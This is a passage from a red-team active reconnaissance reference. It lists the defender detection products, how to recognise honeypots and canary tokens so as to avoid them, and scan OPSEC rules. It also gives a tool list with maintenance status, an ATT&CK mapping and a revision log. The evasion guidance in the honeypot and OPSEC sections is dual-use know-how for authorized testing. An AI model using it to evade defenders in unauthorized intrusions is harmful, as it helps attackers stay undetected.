      - Suspected DCShadow attack (directory service registration)
      - Suspected Golden Ticket usage (forged authorization data)
      - Suspected LSASS extraction or memory injection
      - Suspected pass-the-hash attack
      - Suspected pass-the-ticket attack
      - Suspected NTLM relay attack
      - Reconnaissance using directory services queries
      - Honeytoken account login attempt

  Entra Sign-in Logs + Identity Protection
    Sees: All authentication attempts (success + failure), risk scoring,
          anomalous-sign-in detection (impossible travel, anonymous IP,
          atypical location, malware-linked IP)

CLOUD (cloud-side activity):
  Microsoft Defender for Cloud Apps (MDCA / formerly MCAS)
    Sees: SaaS sessions (M365, Salesforce, Workday, etc.), session-level
          anomaly, OAuth app-grant events, shadow-IT detection
  AWS GuardDuty
    Sees: Malicious IP communication, unusual API patterns, port scanning
          from EC2 instances, suspicious DNS queries
  Wiz / Lacework / Orca (CSPM)
    Sees: Cloud-resource configuration drift, exposed assets, IAM
          over-permissioning, attack-path-graph reconstruction across
          cloud + identity + network layers

NETWORK (network telemetry):
  Vectra AI / Darktrace / ExtraHop Reveal(x) (NDR)
    Sees: East-west scan patterns, lateral-movement patterns, C2 beaconing,
          data exfiltration patterns; ML-based behavioral analysis
  Cisco Stealthwatch / Plixer Scrutinizer (NetFlow analysis)
    Sees: Flow-volume anomalies, new flows to/from hosts

XDR CORRELATION (Microsoft 365 Defender, CrowdStrike XDR, S1 Singularity):
    Chains: scan → failed-auth → identity event → endpoint anomaly →
            cross-tenant access → automated containment within minutes

  This is the real defender capability. Single events benign; chains alert.
```

### 9.4 — Honeypot / Canary Detection (Operator Avoidance)

```
═══════════════════════════════════════════════════════════
RECOGNIZE HONEYPOTS BEFORE TRIGGERING THEM
═══════════════════════════════════════════════════════════
MITRE ATT&CK: T1497 (Virtualization/Sandbox Evasion — adjacent)
NOISE LEVEL:  N/A — recognition phase only

HONEYPOT FAMILIES + RECOGNITION SIGNALS:

CONPOT (SCADA/ICS honeypot — Honeynet Project)
  - Modbus, S7, BACnet, EtherNet/IP, IEC 60870, Guardian-AST stack
  - Recognition signals:
    * Inconsistent OS fingerprint (e.g., Modbus banner on "Cisco IOS" host)
    * Implausibly perfect responses to ALL queried object IDs
    * Default "Siemens AG" string in S7 banner
    * MIB walk returns suspiciously clean / templated data
  - Source: github.com/mushorg/conpot

T-POT (multi-honeypot stack — Deutsche Telekom)
  - Aggregates: Cowrie, Dionaea, Glastopf, Honeytrap, Mailoney, Snare/Tanner
  - Recognition signals:
    * Reverse DNS often points to "*.research.*" / "*.honeynet.*"
    * Source ASN frequently academic / security-research
    * Open ports cluster matching T-Pot defaults (22, 80, 110, 143, 443,
      445, 502, 1433, 5432, 5900)

COWRIE (SSH/Telnet honeypot — Michel Oosterhof)
  - Recognition signals:
    * Specific SSH banner: "SSH-2.0-OpenSSH_5.1p1 Debian-5"
      (frequent default; suspicious if seen with modern OS otherwise)
    * MOTD with suspiciously generic content
    * `uname -a` returns "Linux svr04 3.2.0-4-amd64..." (Cowrie default)
    * Filesystem responses too perfect / consistent

DIONAEA (low-interaction honeypot — Markus Koetter)
  - Recognition: SMB/HTTP banners that don't quite match real Microsoft

GLASTOPF (web honeypot)
  - Recognition: SQLi / RFI / LFI return responses that mimic
    vulnerability but yield no actual data

CANARYTOKENS / THINKST CANARY (defender-deployed canaries)
  - Tokens: AWS keys, AWS secrets, sensitive-named files, DNS canaries
    (any lookup of *.canarytokens.com, *.canary.tools, *.canary.io)
  - Recognition: AWS credentials labeled with suspicious context
    ("PROD_AWS_KEY", "BACKUP_KEY") in unexpected locations are likely
    canary tokens; using them = instant high-fidelity defender alert
  - DNS canaries: ANY DNS query for *.canarytokens.com triggers immediate
    defender alert with full source-IP + DNS-query metadata
  - Sticker URLs: github.com/thinkst/canarytokens

HONEYUSER ACCOUNTS (sweet-bait identities seeded in AD)
  - Common patterns: "svc-honeypot", "honey_admin", high-priv account that
    has never authenticated
  - Recognition: Account in AD with msDS-AdminCount=1, no logon history
    visible in BloodHound, suspicious / template-looking name
  - Use of these triggers MDI "Honeytoken account login attempt" alert

HONEYFILES (sweet-bait files seeded on shares)
  - Common patterns: passwords.xlsx, AdminPasswords.txt in obvious locations
  - Recognition: ALWAYS suspect "too good to be true" file discoveries

OPERATOR HYGIENE:
  - NEVER act on first credential found in suspicious file
  - Recon CT logs of canarytokens.com / canary.tools to know defender
    canary footprint patterns
  - Avoid using AWS keys or other credentials with names suggesting
    "production / admin / backup" without verification
  - DNS resolutions to *.canarytokens.com / *.canary.tools = WALK AWAY
```

```
═══════════════════════════════════════════════════════════
SECTION 9 — SCAN OPSEC BEST PRACTICES
═══════════════════════════════════════════════════════════
1. PASSIVE FIRST — exhaust passive recon (Shodan, Censys, CT logs, etc.)
   before sending ANY active packet.
2. DNS QUERIES BLEND — start with DNS-driven recon; lowest baseline noise.
3. SINGLE HTTPS REQUESTS NEAR-INVISIBLE — cert check, single header grab.
4. TARGETED SCANS >> SWEEPS — specific ports on specific hosts.
5. REALISTIC HEADERS — set User-Agent, Accept, Accept-Language to match
   typical browser; rotate per-host.
6. SCAN FROM EXPECTED SOURCE — cloud VPS for external; domain-joined host
   for internal; route via existing C2 when possible.
7. SPREAD ACROSS TIME — avoid concentrated bursts.
8. SAVE RESULTS LOCALLY — never re-scan what you've mapped.
9. KNOW YOUR DEFENDER — verify which detection products are deployed
   from passive recon (§8.2 job postings) before choosing techniques.
10. AVOID HONEYPOTS — recognize Conpot / T-Pot / Cowrie patterns; never
    use canary-labeled credentials.
```

---

## 10 — TOOL QUICK REFERENCE (MAINTENANCE STATUS)

```
═══════════════════════════════════════════════════════════
LEGEND: ✅ Active   ⚠ Stalled / Limited   ❌ Dead / Replaced   $ Paid
═══════════════════════════════════════════════════════════

HOST DISCOVERY:
  ✅ Nmap (-sn)              Network host discovery (ICMP/TCP/ARP/UDP)
  ✅ Naabu                   ProjectDiscovery; v2.5.0 (March 2026)
  ✅ Masscan                 Ultra-fast port/host discovery
  ✅ ZMap / ZGrab2           Internet-scale (academic-grade); v4.3.4 (April 2026)
  ✅ Netdiscover             ARP-based discovery (active + passive)
  ✅ fping                   Fast ICMP ping sweep
  ✅ arp-scan                Local subnet ARP scan
  ✅ nbtscan / nmblookup     Legacy NetBIOS networks
  ✅ Responder (-A)          Passive broadcast listener (zero noise)
  ✅ Inveigh                 PowerShell Responder equivalent (Windows)
  ✅ avahi-browse / dns-sd   mDNS / DNS-SD active queries
  ✅ adb (5555 ADB-over-net) Android device shell (when exposed)

PORT SCANNING:
  ✅ Nmap                    Industry standard — SYN/Connect/UDP/Idle/script
  ✅ Naabu                   ProjectDiscovery fast SYN
  ✅ Masscan                 Fastest port scanner (millions pps)
  ✅ RustScan                Rust-based; less ergonomic than Naabu in 2026
  ✅ ZMap                    Internet-wide IPv4 sweeps

SERVICE ENUMERATION (general):
  ✅ NetExec (nxc)           CME canonical successor; Pennyw0rth/NetExec
                             v1.3.0+ (CME archived Dec 2023)
  ✅ enum4linux-ng           cddmp/enum4linux-ng v1.3.7 (Sept 2025)
  ❌ enum4linux              Original deprecated; use enum4linux-ng
  ❌ CrackMapExec            Archived Dec 2023; replaced by NetExec
  ✅ ldapsearch              LDAP query tool
  ✅ kerbrute                ropnop/kerbrute v1.0.3 (Dec 2025);
                             generates MDI alerts in modern AD
  ✅ snmpwalk / onesixtyone  SNMP enumeration + community brute
  ✅ ssh-audit               jtesta/ssh-audit v3.3.0+; supports OpenSSH 9.x
  ✅ smtp-user-enum          SMTP user enum (VRFY/RCPT/EXPN)
  ✅ rpcclient               RPC enumeration (Samba)
  ✅ Impacket                fortra/impacket (transitioned from
                             SecureAuthCorp Jan 2023)

ACTIVE DIRECTORY:
  ✅ BloodHound CE           SpecterOps; v9.0+ as of April 2026
                             (top-to-bottom rewrite from BH Legacy)
  ✅ SharpHound              Windows AD collector for BloodHound CE
  ✅ AzureHound              SpecterOps; v2.11.0 (March 2026); Entra ID
                             enumeration; weaponized by Storm-0501,
                             Void Blizzard per MS Threat Intel Aug 2025
  ✅ BloodyAD                cravaterouge; AD enumeration + abuse with creds
  ✅ BloodHound.py           dirkjanm/BloodHound.py; canonical Python
                             collector for BHCE; Kali pkg name
                             `bloodhound-ce-python`

WEB APPLICATION:
  ✅ Feroxbuster             Fast recursive directory brute (Rust)
  ✅ Gobuster                Directory/DNS/VHost brute (Go)
  ✅ ffuf                    Fast web fuzzer (Go); very flexible
  ✅ Dirsearch               Directory brute (Python)
  ✅ httpx                   ProjectDiscovery; HTTP probing + tech detect
  ✅ katana                  ProjectDiscovery; modern web crawler
  ✅ unfurl                  URL parsing for crawl pipelines
  ✅ gowitness               Chromium-based screenshot at scale
  ✅ aquatone                Legacy but functional screenshot tool
  ✅ eyewitness              Multi-protocol web screenshotting
  ✅ whatweb                 Tech fingerprinting
  ✅ Wappalyzer              Tech detection (browser ext + API)
  ✅ dnsx                    Fast DNS resolution (ProjectDiscovery)
  ✅ subfinder               Passive subdomain enum (cross-ref §1)

API / GRAPHQL / GRPC:
  ✅ grpcurl                 gRPC reflection / invocation
  ✅ clairvoyance            GraphQL field-suggestion exploitation
  ✅ graphw00f               GraphQL server fingerprinting
  ✅ InQL                    Burp extension for GraphQL
  ✅ jwt_tool                JWT analysis + manipulation
  ✅ corsy                   CORS misconfiguration scanner
  ✅ smuggler                HTTP request smuggling detection
  ✅ h2csmuggler             H2C upgrade smuggling

VULNERABILITY SCANNING:
  ✅ Nuclei                  ProjectDiscovery; v3.x (templates v9 schema);
                             AI template generation 2024+
  ✅ Nmap NSE                Nmap 7.95+ scripting engine (612+ scripts;
                             added ICS-specific in 7.95)
  $  Nessus                  Tenable; commercial comprehensive scanner
  $  Qualys VMDR             Cloud-hosted vulnerability mgmt
  $  Rapid7 InsightVM        Vulnerability mgmt platform
  ✅ OpenVAS / Greenbone     Free + paid (Greenbone Enterprise)
  ✅ searchsploit            Local Exploit-DB mirror
  ✅ vulncheck-kev           CISA KEV / VulnCheck KEV CLI
  ✅ CVE_Prioritizer         Risk-scoring helper
  ✅ testssl.sh              TLS/SSL configuration audit
  ✅ sslscan                 SSL cipher and cert analysis

CONTAINER / K8S:
  ✅ Trivy                   Aqua Security; image / fs / IaC / k8s scanning
  ✅ Grype                   Anchore; alternative to Trivy
  ✅ Syft                    Anchore; SBOM generator
  ✅ Docker Scout            Docker Inc.; image vuln scanning
  ✅ kube-hunter             Aqua Security; K8s vuln scanner
  ✅ kubeletctl              Kubelet-API interaction
  ✅ peirates                K8s pentest swiss-army-knife
  ✅ kube-bench              CIS K8s benchmark scanner

CLOUD ENUMERATION:
  ✅ cloud_enum              initstring; multi-cloud asset enumeration
  ✅ S3Scanner               sa7mon; AWS S3 bulk testing
  ✅ MicroBurst              NetSPI; Azure recon (Oct 2025 update)
  ✅ ScoutSuite              NCC Group; multi-cloud audit (v5.14.0)
  ✅ Prowler                 Multi-cloud audit
  ✅ CloudFox                Bishop Fox; AWS post-cred recon
  ✅ Pacu                    Rhino Security; AWS exploitation framework
  ✅ AADInternals            Nestori Syynimaa; Entra outsider + post-cred
  ✅ ROADtools               dirkjanm; Entra post-cred (some 403 in 2026)
  ✅ aws-account-detective   Frichetten; AWS account ID enumeration
  ✅ Quiet Riot              righteousgambit; AWS principal enum
  ✅ gcp_enum / GCP-IAM-PrivEsc  RhinoSecurityLabs; GCP IAM enum

ICS / OT (USE WITH EXTREME CAUTION):
  ✅ Nmap NSE ICS scripts    7.95+ added hartip-info, profinet-cm-lookup,
                             s7-info, modbus-discover, dnp3-info, enip-info
  ⚠ PLCScan                  yanlinlin82/plcscan; legacy but functional
  ✅ Snap7 / python-snap7    Siemens S7 client library
  ✅ opcua-asyncio           OPC UA Python client
  $  Tenable.ot              ICS-specific scanner (safe profile)
  $  Claroty / Nozomi / Dragos  Specialized OT detection + recon platforms

MAIL / SIP / MESSAGING:
  ✅ smtp-user-enum          SMTP user enumeration
  ✅ MailSniper              Microsoft 365 enumeration toolkit
  ✅ o365creeper / MSOLSpray Username validation against Entra
  ✅ SIPVicious (svmap/...)  SIP enumeration toolkit
  ✅ kcat                    Kafka topic / broker enumeration
  ✅ mosquitto-cli           MQTT subscribe / publish

EXPLOIT FRAMEWORKS:
  ✅ Metasploit Framework    rapid7/metasploit-framework
  ✅ Cobalt Strike (paid)    Fortra / HelpSystems
  ✅ Sliver                  BishopFox; open-source C2
  ✅ Mythic                  C2 framework; SpecterOps-adjacent
  ✅ Havoc                   C2 framework; community

METHODOLOGY REFERENCES:
  MITRE ATT&CK TA0043        https://attack.mitre.org/tactics/TA0043/
  MITRE ATT&CK TA0007        https://attack.mitre.org/tactics/TA0007/
  CISA KEV Catalog            https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  CISA AA26-113a Volt Typhoon https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-113a
  PTES                        Penetration Testing Execution Standard
  OSSTMM                      Open Source Security Testing Methodology Manual
  NIST SP 800-115             Technical Guide to Information Security Testing
```

---

## 11 — MITRE ATT&CK MAPPING MATRIX

```
═══════════════════════════════════════════════════════════
TA0043 RECONNAISSANCE — ACTIVE SUBSET COVERAGE
═══════════════════════════════════════════════════════════

T1595 — Active Scanning
  ├── T1595.001 Scanning IP Blocks           → §1 (host discovery), §2.1-2.4
  ├── T1595.002 Vulnerability Scanning       → §6.X cloud, §8 vuln scan
  └── T1595.003 Wordlist Scanning            → §5.4 dirbust, §5.6 API enum,
                                                §6 cloud bucket guessing

T1589 — Gather Victim Identity Information
  └── T1589.* (covered in passive recon §4)

T1590 — Gather Victim Network Information
  └── T1590.* (covered in passive recon §1, §2)

T1592 — Gather Victim Host Information
  ├── T1592.002 Software                     → §3 service enum, §5.3 tech FP
  └── T1592.* (rest in passive recon §11)

═══════════════════════════════════════════════════════════
TA0007 DISCOVERY — POST-ACCESS COVERAGE
═══════════════════════════════════════════════════════════

T1018 — Remote System Discovery               → §1.2-1.5 internal discovery,
                                                §3.1 SMB net view
T1046 — Network Service Discovery             → §2 port scanning, §3 service
                                                enum (overlaps multiple subs)
T1016 — System Network Configuration Discovery → §1.5 C2-routed (ipconfig,
                                                  Get-NetIPConfiguration)
T1049 — System Network Connections Discovery   → §1.5 (netstat, Get-NetTCPConnection)
T1057 — Process Discovery                      → §3.5 SNMP process MIB
                                                  (also via §1.5 host-side)
T1069 — Permission Groups Discovery
  ├── T1069.001 Local Groups                  → SMB net localgroup
  ├── T1069.002 Domain Groups                 → §3.2 LDAP, BloodHound CE
  └── T1069.003 Cloud Groups                  → §6 cloud enum
T1082 — System Information Discovery           → §1.5, §3 (per-protocol banner)
T1083 — File and Directory Discovery           → §3.1 SMB share enum, §3.6 NFS
T1087 — Account Discovery
  ├── T1087.001 Local Account                 → SMB enum, SAM enum
  ├── T1087.002 Domain Account                → §3.2 LDAP, §3.3 Kerberos
  └── T1087.004 Cloud Account                 → §3.11 identity-plane, §6 cloud
T1095 — Non-Application Layer Protocol         → §1.4 Responder passive
T1135 — Network Share Discovery                → §3.1 SMB, §3.6 NFS
T1482 — Domain Trust Discovery                 → §3.2 LDAP trust enum,
                                                  BloodHound CE trusts collection
T1518 — Software Discovery                     → §3.5 SNMP installed-software MIB
T1526 — Cloud Service Discovery                → §6 cloud asset enumeration
T1538 — Cloud Service Dashboard                → §6.X (vendor consoles)
T1613 — Container and Resource Discovery       → §3.8 K8s, §3.17 container runtime

═══════════════════════════════════════════════════════════
ICS-SPECIFIC ATT&CK (TA0102+)
═══════════════════════════════════════════════════════════
T0846 — Remote System Discovery (ICS)          → §7 ICS protocols
T0840 — Network Connection Enumeration (ICS)   → §7.X
T0888 — Remote System Information Discovery    → §7 device-info NSE scripts
```

---

## CHANGE SUMMARY (vs. prior revision dated 02 April 2026)

**Critical fixes:**
- **§3.8** — Corrected K8s assertion: kubelet (10250) anonymous defaults are SEPARATE from API server (6443). Kubelet `/pods`, `/runningpods`, `/configz`, `/exec` endpoints permitted anonymous access historically; fine-grained kubelet authorization only graduated to GA on 24 April 2026 in K8s v1.36, meaning sub-1.36 production clusters STILL frequently allow unauthenticated kubelet enumeration. Source: [Kubernetes blog 2026-04-24](https://kubernetes.io/blog/2026/04/24/kubernetes-v1-36-fine-grained-kubelet-authorization-ga/).

**Major additions:**
- **§4** — NEW: Edge / VPN Appliance Fingerprinting section (M1) covering Cisco Secure Client (post-2022 AnyConnect rebrand M14, legacy AnyConnect EOL March 2024), Palo Alto GlobalProtect, Fortinet, Citrix NetScaler, Ivanti Connect Secure, F5 BIG-IP APM, Sophos/SonicWall/WatchGuard.
- **§4.8** — NEW: Per-vendor CVE quick-recognition matrix (M2) — Ivanti CVE-2024-21887/-46805/CVE-2025-0282/-22457; Fortinet CVE-2024-21762/-47575; Citrix CVE-2024-3661/-8534; Palo Alto CVE-2024-3400; Veeam CVE-2024-40711/CVE-2025-23120; with Nuclei tag selectors. Sources: [Rapid7 CVE-2025-22457](https://www.rapid7.com/blog/post/2025/04/03/etr-ivanti-connect-secure-cve-2025-22457-exploited-in-the-wild/) · [Google Cloud FortiManager](https://cloud.google.com/blog/topics/threat-intelligence/fortimanager-zero-day-exploitation-cve-2024-47575) · [Palo Alto CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400) · [Rapid7 CVE-2025-23120](https://www.rapid7.com/blog/post/2025/03/19/etr-critical-veeam-backup-and-replication-cve-2025-23120/).
- **§7** — NEW: ICS / OT Discovery section (M3) — Modbus, DNP3, EtherNet/IP, OPC UA, BACnet, S7/PROFINET, IEC 61850, HART-IP. Includes Volt Typhoon / KV Botnet context. Source: [CISA AA26-113a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-113a).
- **§3.11** — NEW: Identity-plane active enumeration (M4) — username validation via M365 sign-in response codes (AADSTS error mapping), Okta/Auth0 endpoint probing, ADFS endpoint discovery, AzureHound (v2.11.0+ March 2026, weaponized by Storm-0501 / Void Blizzard), BloodyAD. Source: [SpecterOps/AzureHound](https://github.com/SpecterOps/AzureHound).
- **§3.3** — Kerberos enumeration reframed as **HIGH NOISE / BURNED in modern enterprise** with explicit MDI alert mapping ("Suspected user enumeration", "Suspected AS-REP Roasting", "Suspected Kerberos SPN exposure (Kerberoasting)") (M8). Source: [MS Learn MDI alerts](https://learn.microsoft.com/en-us/defender-for-identity/alerts-mdi-classic).
- **§5.7-5.14** — NEW modern web TTPs (M5) — GraphQL field-suggestion (clairvoyance, graphw00f), gRPC reflection enumeration (grpcurl), HTTP Request Smuggling (smuggler.py, h2csmuggler), Web Cache Deception, JWT analysis (jwt_tool), CORS scanner (corsy), WebSocket enumeration, HTTP/2-3 (QUIC).
- **§3.10, §3.13-3.21** — NEW critical service ports (M6, G1-G4, G7) — Veeam (9419/9392), VMware vCenter (/sdk), SolarWinds Orion, PRTG, ManageEngine, Mail/Exchange/OWA/EWS endpoints, SIP/VoIP (5060), CI/CD (Jenkins/TeamCity/ArgoCD/Spinnaker/etc.), observability (Grafana/Kibana/Prometheus/Jaeger/Loki), MongoDB, Redis, OpenSearch/Elastic, ClickHouse, InfluxDB, Cassandra, Snowflake, RabbitMQ, Kafka, ActiveMQ (CVE-2023-46604), NATS, MQTT, AMQP, internal package registries (Artifactory, Nexus, Harbor), container runtime sockets, service mesh (Istio, Linkerd, Consul Connect).
- **§1.2** — NEW modern host-discovery techniques (M7) — mDNS / DNS-SD active queries (avahi-browse, dns-sd), WSD (Web Services Discovery), SSDP (UPnP), nbtscan/nmblookup. §1.7 NEW Android Debug Bridge (5555) enumeration (G15).
- **§3.13** — NEW: Mail / Exchange / Calendar protocol enumeration (G1) including Exchange ECP/OWA endpoints, version-build-number disclosure, CalDAV/CardDAV/IMAP/POP3.
- **§3.14** — NEW: VoIP / SIP enumeration (G2) — SIPVicious, CUCM, Asterisk, FreePBX, 3CX, plus H.323 (G19), WebRTC STUN/TURN (G16).
- **§3.19** — NEW: Print / IoT / IP-Camera enumeration (G9) — printers (9100, 631, PRET, Praeda), RTSP cameras, ONVIF, Hikvision, Dahua, Axis, BAS (KNX), smart-TV/Cast devices.
- **§9.4** — NEW: Honeypot / canary detection for operator avoidance (G8) — Conpot, T-Pot, Cowrie, Dionaea, Glastopf, Canarytokens, honey-user-account recognition.
- **§5.17** — NEW: WAF / CDN bypass discovery (G10) — active counterpart to passive recon §3.4.
- **§6.6** — NEW: HashiCorp Vault, Consul, Etcd enumeration (G5).
- **§6.5** — NEW: Container / artifact registry discovery cross-ref + extended (G5, G12).
- **§3.20** — NEW: Apple ecosystem mDNS enumeration (G12).
- **§3.21** — NEW: iSCSI (3260) enumeration (G13).
- **§3.22** — NEW: Service mesh enumeration (G14) — Istio, Linkerd, Consul Connect, Envoy admin endpoint.
- **§1.6** — NEW: Network segmentation discovery (G11) — pinhole mapping, TTL/MTU analysis.
- **§3.13** — NEW: Mail/Exchange/CalDAV enumeration with CVE matrix.

**Major modernization:**
- **§3.1 SMB** — Added Server 2025 mandatory-signing default note (M12); explicit modern-Windows null-session restriction history.
- **§3.2 LDAP** — Added rootDSE leakage detail; LDAP signing/channel binding required default note.
- **§6** — Cloud section restructured into 7 subsections (R1, R2): AWS extended (M11 — Lambda URL patterns, API Gateway, S3 Transfer Acceleration, ECS metadata SSRF endpoints, account-ID enum cross-ref); Azure extended; **GCP fully expanded** (M10 — gcp_enum.py, GCPBucketBrute, project-ID guessing, IAM impersonation chains, Cloud Run / Functions URL patterns, ScoutSuite); K8s corrected (cross-ref §3.8); Vault/Consul/Etcd; multi-cloud audit (ScoutSuite, Prowler, CloudFox, Pacu); cloud metadata service awareness (G17).
- **§8** — Vulnerability scanning expanded: Nuclei v3 templates v9 schema (M14 — `-update-templates`, AI-assisted template generation 2024+), Naabu (G G17 — v2.5.0 March 2026), modern syntax for greenbone-feed-sync (m11), container vuln scanning (Trivy/Grype/Syft/Docker Scout), exploit-availability tools (CVE_Prioritizer, vulncheck-kev), AI-driven recon flag (G18, Emerging).
- **§10 Tools** — Restructured tool reference (M9, M13) with maintenance status legend; explicit canonical-repo references: NetExec (Pennyw0rth, since CME archived Dec 2023), enum4linux-ng (cddmp v1.3.7), BloodHound CE (SpecterOps v9.0+), AzureHound (v2.11.0+), BloodyAD, BloodHound.py (dirkjanm), Impacket (fortra since Jan 2023), Nmap 7.95+ ICS scripts. Sources: [GitHub Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) · [GitHub cddmp/enum4linux-ng](https://github.com/cddmp/enum4linux-ng) · [GitHub fortra/impacket](https://github.com/fortra/impacket) · [Cisco Secure Client rebrand](https://blogs.cisco.com/security/more-than-a-vpn-announcing-cisco-secure-client-formerly-anyconnect).
- **§9** — Detection table expanded with NDR (Vectra/Darktrace/ExtraHop), CSPM (Wiz/Lacework/Orca), XDR cross-platform correlation; new "Defender Stack — What Each Product Sees" reference table including specific MDI alert names (M8).
- **§11** — NEW: Standalone ATT&CK mapping matrix covering TA0043 active subset + TA0007 Discovery + ICS-specific TA0102+ (T0846, T0840, T0888); previously-missing T1057, T1083, T1087.001 added (M15).

**Reframing:**
- Document preamble explicitly states ACTIVE-RECON noise taxonomy (NEAR-ZERO / LOW / MEDIUM / HIGH / VERY HIGH / EXTREME) used throughout each technique's banner header (R1).
- §0 expanded with Quick Decision Tree by engagement constraint (R3) and Modern Detection Surface reference (parallel to passive recon's per-technique DETECTION fields).
- Per-technique banner headers now include explicit MITRE ATT&CK ID, NOISE LEVEL, DETECTION (target / third-party where relevant), and current MDI/EDR alert names where applicable (matches user's Phase 4 style requirement).

**Minor corrections:**
- Cisco AnyConnect → **Cisco Secure Client** rebrand (renamed July 2022; legacy AnyConnect EOL March 2024) (M14).
- §3.6 SSH — added CVE-2024-6387 (regreSSHion) detection (m3).
- §3.9 RDP — added CVE-2024-38077 / CVE-2025-21323 references (m2).
- §3.3 Kerberos — added PKINIT detection note (m4).
- §1.2 — added nbtscan / nmblookup for legacy NetBIOS (m5).
- §5.5 — added katana, gowitness, aquatone, eyewitness, unfurl (m6).
- §6 OpenVAS — corrected to greenbone-feed-sync (m7).
- §9 — added NDR/CSPM/XDR detection layers (m8).
- §6 AWS — explicit OPSEC note about authenticated CloudTrail logging (m11).
- §3.5 SNMP — added v3 partial enumeration (m12).
- §1.2 — added WSD probing (m13).

**Removed:**
- "Kubelet anonymous auth disabled by default since K8s 1.10+" assertion (factually conflated API server with kubelet defaults).
- Implication that kerbrute is "moderate noise" (corrected to HIGH / BURNED in modern AD).
- Generic "BloodHound" without distinguishing Legacy vs CE.

---

## OUTSTANDING ITEMS — UNVERIFIED / EMERGING / CONTESTED

| Item | Status | Evidence Required to Resolve |
|---|---|---|
| Fortinet **CVE-2025-32756** | **Unverified** — referenced in vendor channels but full CVE details not surfaced in research. | Fortinet PSIRT advisory at fortiguard.com when published. |
| BloodHound CE v9.0 RC vs v9.0 GA | **Volatile** — at time of writing v9.0 RC4 (April 2026); GA expected mid-2026. Some collector behaviors may shift between RC and GA. | SpecterOps blog announcement of GA + collector compatibility matrix. |
| AzureHound weaponization attribution (Storm-0501, Void Blizzard) | **Confirmed historical (Aug 2025 MS reporting)** — but these threat actors evolve rapidly; current Q2 2026 attribution may have shifted. | Microsoft Threat Intelligence latest reporting. |
| ROADtools `roadrecon gather` 403 errors | **Emerging** — confirmed reproducer in some 2026 tenant configurations. Not all tenants affected. Microsoft has not publicly documented the change. | dirkjanm/ROADtools GitHub issues; community workaround thread. |
| Kerbrute (ropnop) maintenance status | **Stable but slowing** — v1.0.3 Dec 2025; minimal recent activity. Functional and canonical, but a fork or successor may emerge if abandonment continues. | github.com/ropnop/kerbrute commit activity check. |
| Kubernetes v1.36 fine-grained authz GA boundary | **Confirmed (24 April 2026)** — but production cluster upgrade cadence means many clusters at v1.30-v1.35 will persist for 12-24 months. Operator estimate: 60-80% of 2026 production fleets still permit kubelet anonymous read. | Per-engagement CIS Kubernetes Benchmark + cluster-version check. |
| Stealer-log marketplace operational status | **Volatile** — same as passive recon §6.2; marketplaces shift quarterly. | Continuous monitoring via threat-intel feeds. |
| Volt Typhoon / Salt Typhoon attribution | **Confirmed (CISA AA26-113a April 2026; AA24-038A Feb 2024)** — but specific TTPs evolve; CISA periodically issues fresh advisories. | CISA cybersecurity advisories at cisa.gov/news-events/cybersecurity-advisories. |
| MITRE ATT&CK ICS framework numbering (T0xxx) | **Stable** — TA0102+ ICS tactics confirmed against attack.mitre.org. ATT&CK v16 expected later 2026 may renumber some sub-techniques. | attack.mitre.org direct verification. |
| AI-assisted recon tooling efficacy | **Emerging — limited public validation** — PentestGPT, HackingBuddyGPT, Nuclei AI templates show value as accelerators but produce hallucinated exploit chains; require operator verification. Field is rapidly evolving. | Academic and red-team-community evaluations through 2026. |
| Server 2025 mandatory SMB signing impact on NTLM relay | **Confirmed (released Nov 2024)** — but rollout into production is gradual; legacy DCs and member servers persist for years. NTLM relay landscape against fresh deployments is materially degraded. | Per-engagement SMB-signing audit via `nxc smb --gen-relay-list`. |
| Censys / Shodan / Quake / Hunter free-tier policy drift | **Volatile** — pricing pages change quarterly. | Vendor pages at time of use. |
| Veeam CVE patch adoption | **Observed lag** — CVE-2024-40711 (Sept 2024) and CVE-2025-23120 (March 2025) patches available but adoption remains behind in mid-market enterprises (per ransomware-incident DFIR reports through Q1 2026). | Vendor update + Veeam community version-survey data. |

---

***Valid as of 28 April 2026***

*Mapped to: MITRE ATT&CK TA0043 (Reconnaissance — active subset) + TA0007 (Discovery — post-access) + TA0102+ (ICS subset). Full sub-technique coverage in §11. Companion documents: §01 Passive Reconnaissance · §03 Initial Access · §04 Persistence · §05 Privilege Escalation · §06 Lateral Movement · §07 Exfiltration · §08 Active Directory · §09-12 Web/App/Mobile/Wireless · §13 Wireless.*
